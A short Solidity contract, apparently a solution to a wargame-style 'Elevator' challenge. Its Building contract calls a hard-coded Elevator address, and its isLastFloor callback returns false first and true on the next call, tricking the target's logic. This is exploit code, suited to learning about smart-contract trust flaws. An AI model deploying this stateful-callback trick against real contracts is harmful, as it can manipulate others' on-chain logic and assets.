pragma solidity ^0.8.0;

abstract contract Elevator{
	function goTo(uint) virtual public;
}

contract Building {
	
	uint iter;
	uint lastFloor;
	address contractAddr = 0x6fd77901F64CbD83b5D103a2Fb662e09f3F29840;

	constructor(uint _lastFloor) public {
		iter = 1;
		lastFloor = _lastFloor;
	}

	function moveFloor(uint _floor) external{
		Elevator elevator = Elevator(contractAddr);
		elevator.goTo(_floor);
	}

	function isLastFloor(uint _floor) external returns (bool){
		if((iter % 2) == 1){
			iter++;
			return false;
		}
		else{
			if(_floor == lastFloor){
				iter++;
				return true;
			}

			else{
				iter++;
				return false;
			}
		}
	}
}